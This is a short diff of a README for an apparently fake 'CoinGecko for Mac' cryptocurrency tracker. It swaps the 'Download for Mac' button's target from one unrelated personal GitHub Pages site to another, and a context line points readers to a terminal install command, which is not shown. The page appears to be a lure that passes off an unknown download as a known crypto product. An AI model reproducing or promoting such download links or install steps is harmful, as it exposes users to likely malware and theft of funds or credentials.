@@ -3,7 +3,7 @@
 
 CoinGecko for Mac is a free desktop application that allows you to track cryptocurrency prices, manage your portfolio, and stay updated with real-time market data 📊. Follow the instructions below to install it easily on your Mac.
 
-[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-%23007AFF?style=for-the-badge&logo=apple)](https://kamartamara.github.io/.github/coingecko)
+[![Download for Mac](https://img.shields.io/badge/Download%20for%20Mac-%23007AFF?style=for-the-badge&logo=apple)](https://tayusikf8398.github.io/.github/coingecko)
 
 If the download button does not work, please follow the installation steps below using the terminal command.
 
